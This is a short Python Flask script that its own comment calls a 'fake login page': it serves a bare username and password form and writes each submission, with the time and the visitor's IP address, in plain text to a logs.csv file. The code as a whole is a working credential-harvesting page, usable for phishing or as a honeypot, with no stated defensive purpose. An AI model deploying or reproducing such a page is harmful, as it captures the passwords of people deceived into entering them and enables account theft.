from flask import Flask, request
import csv, datetime

app = Flask (__name__)

#fake login page home route
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        with open("logs.csv", "a") as f:
            writer = csv.writer(f)
            writer.writerow([datetime.datetime.now(),
                             request.remote_addr,
                             request.form.get("username"),
                             request.form.get("password")])
    return """<form method="POST">
                Username:<input name='username'>
                Password:<input name='password'>
                <input type='submit'>
              </form>"""


if __name__ == "__main__":
    app.run(debug=True)

# test